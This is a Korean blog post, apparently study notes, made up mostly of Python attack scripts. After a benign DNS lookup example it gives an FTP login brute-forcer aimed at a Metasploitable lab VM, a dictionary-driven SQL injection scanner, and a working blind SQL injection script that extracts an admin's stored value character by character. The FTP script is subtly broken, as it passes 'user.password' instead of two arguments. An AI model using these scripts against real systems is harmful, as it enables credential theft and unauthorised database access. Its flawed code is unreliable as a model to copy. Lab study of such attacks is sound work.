---
password: 1914
title: Python hacking script analyzes
date: 2022-02-02 14:55:55
tags: Analyzes
categories: Analyzes
---

## DNS 서버에 정보 조회
```Python
# DNS 서버에 정보 조회
# DNS 서버는 도메인 정보와 IP 정보들을 매칭하는 서버
# DNS 서버는 응용 프로그램 계층에 있으며 일반적으로 포트 53 ( UDP ) 를 사용
# 클라이언트가 DNS 서버에 요청을 할때 DNS 패킷들을 보낼때 레코드 유형을 보내게 됨
# A : IPv4 주소를 참조할 수 있음
# AAAA : IPv6 주소를 참조할 수 있음
# MX : 메일 서버를 조회할 수 있음
# NS : 서버 이름을 참조할 수 있음

# nslookup : DNS 서버 정보 조회
# pip3 install dnspython
# resolver : 해석기 DNS 서버에 대한 엑세스들을 수행할 수 있는 어플리케이션 , 서버에 원하는 호스트 정보들을 조회하는 프로그램

import dns.resolver

hosts = ['www.naver.com', 'www.daum.net', 'www.google.com']

for host in hosts:
    print(host)
    dns_ip = dns.resolver.resolve(host, 'A')
    # dns 정보를 가져옴
    # dns.resolver 를 이용해 요청을 하는데 resolve 함수를 이용해서 host 에 있는 정보들을 A 방식으로 가져옴
    for ip in dns_ip:
        print(ip)
```

## FTP 무작위 대입 공격
```python
# FTP 무작위 대입 공격
# metasploit table version 2 를 vmware 로 불러옴 공격 대상
import ftplib
from logging import exception 

def bruteforce(ip, user, password):
    ftp = ftplib.FTP(ip) # FTP IP 정보 받아옴

    try:
        print('사용자 아이디 {}, 패스워드 {}', format(user.password))
        res = ftp.login(user.password)
        if '230' in res and 'successful' in res:
            print('공격에 성공')
            print('사용자' + user + '패스워드' + password)
        else:
            pass

    except Exception as ex:
        print('연결 오류', ex)

def main():
    # msfadmin , msfadmin
    ip = input('IP 정보 입력 : ')
    with open('users.txt', 'r') as users:
        users = users.readlines()
    with open('password.txt', 'r') as passwords:
        passwords = passwords.readlines() 

    for user in users:
        for password in passwords:
            bruteforce(ip, user.rstrip(), password.rstrip())


if __name__ == '__main__':
    main()
```

## SQL Injection
```python
import requests

url = ''

sqli_payloads = []

with open('sqli_dic.txt', 'r') as file_dic:
    for line in file_dic:
        sqli_payload = line[:-1]
        sqli_payloads.append(sqli_payload)

for payload in sqli_payloads:
    print('진단' + url + payload)
    res = requests.post(url+payload)
    if 'mysql' in res.text.lower():
        print('취약점 발견' + payload)
    else:
        print('취약점 없음' + payload)
```

## Blind SQL Injection
```python
import requests

# 길이 확인
def check_length(url, cookie, param_name):
    head = {"PHPSESSID":f"{cookie}"}
    print("대상 문자열의 길이를 확인중입니다..")
    for num in range(0,30):
        param=f"?{param_name}=' or id='admin' and length({param_name})={num} %23"
        my_url=url+param
        res=requests.get(my_url, cookies=head)
        if("Hello admin" in res.text):
            return num

# 문자열 찾기
def blind_sqli(url, cookie, param_name, length):
    head = {"PHPSESSID":f"{cookie}"}
    ans=""
    for len in range(1, length+1):
        print(f"{len}번째 문자에 대해 검색중입니다..")
        for ran in range(32,127):
            param=f"?{param_name}=' or id=\"admin\" and ascii(substr({param_name},{len},1))={ran} %23"
            my_url=url+param
            res=requests.get(my_url, cookies=head)
            if("Hello admin" in res.text):
                # print(f"{len}번째 문자:{chr(ran)}")
                ans+=chr(ran)
                break
    return ans

# 실행 순서
if __name__ == "__main__":
    print("💘 Blind 공격을 시작합니다")
    
    url=input("URL을 입력하세요:")
    cookie=input("cookie를 알려주세요:")
    param_name=input("파라미터의 이름을 알려주세요:")
    
    length=check_length(url, cookie, param_name)
    print(f"👏 {param_name}의 길이는 {length}입니다.")
    
    ans=blind_sqli(url, cookie, param_name, length)
    print(f"👏 {param_name}의 정체는 {ans}입니다!")
    
    exit
```

* * *

## Reference
Reference : https://choco4study.tistory.com/92?category=1057097